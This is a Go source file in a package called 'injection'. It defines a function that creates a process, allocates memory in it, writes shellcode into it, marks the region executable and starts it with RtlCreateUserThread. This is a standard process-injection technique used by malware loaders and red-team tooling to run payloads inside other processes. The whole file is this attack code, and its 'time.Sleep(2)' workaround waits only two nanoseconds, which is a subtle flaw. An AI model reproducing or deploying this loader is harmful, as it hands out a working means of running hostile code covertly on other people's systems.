package injection

import (
	"time"
	"unsafe"
)

func RtlCreateUserThreads() {
	procInfo := createProcess()

	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	// Workaround, cannot write to process memory before allocation finished, will have to fix for later.
	time.Sleep(2)
	WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	var tHandle uintptr
	RtlCreateUserThread.Call(uintptr(procInfo.Process), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

	CloseHandle.Call(uintptr(uint32(procInfo.Process)))
}
